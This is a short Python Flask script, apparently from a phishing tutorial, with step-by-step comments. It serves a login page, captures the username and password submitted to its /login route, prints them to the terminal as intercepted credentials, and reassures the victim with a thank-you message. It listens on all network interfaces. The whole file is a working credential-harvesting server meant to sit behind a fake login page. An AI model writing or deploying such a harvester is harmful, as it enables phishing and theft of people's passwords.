# ================================
# 📦 Import Flask modules
# ================================
# Flask: a lightweight web framework used to create local HTTP servers.
# render_template: allows Flask to render HTML files stored in /templates.
# request: lets you read form data sent from the browser (POST requests).
from flask import Flask, render_template, request


# ===================================
# ⚙️ Initialize the Flask application
# ===================================
# By default, Flask expects:
#   - HTML files inside a folder named "templates/"
#   - CSS / JS / images inside "static/"
# So if you follow that structure, this line is all you need:
app = Flask(__name__)


# ======================================
# 🌐 Main route — serves the login page
# ======================================
# This route is triggered when a user visits http://127.0.0.1:8080/
# It simply loads and displays the HTML file found in /templates/index.html
@app.route('/')
def index():
    # Flask automatically looks for the HTML file inside /templates/
    return render_template('index.html')


# =========================================================
# 🔐 /login route — handles form data sent via POST request
# =========================================================
# This route is called when the user submits the form.
# The form in index.html must have: action="/login" and method="POST"
@app.route('/login', methods=['POST'])
def login():
    # Retrieve form fields using request.form.get()
    # Flask automatically parses the POST request body for you.
    username = request.form.get('username')
    password = request.form.get('password')

    # Print the received credentials to the terminal
    # This is where you “intercept” the credentials.
    print(f"[+] Received credentials -> Username: {username}, Password: {password}")

    # Return a simple confirmation message to the browser
    # This prevents the user from seeing a blank page after submitting the form.
    return f"<h3>Thanks {username}! Credentials received.</h3>"


# ===================================
# 🚀 Run the Flask web server
# ===================================
# This block starts the server when you run:
#   python3 http_server.py
#
# - host='0.0.0.0' → listens on all network interfaces
# - port=8080 → defines which port the server runs on
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
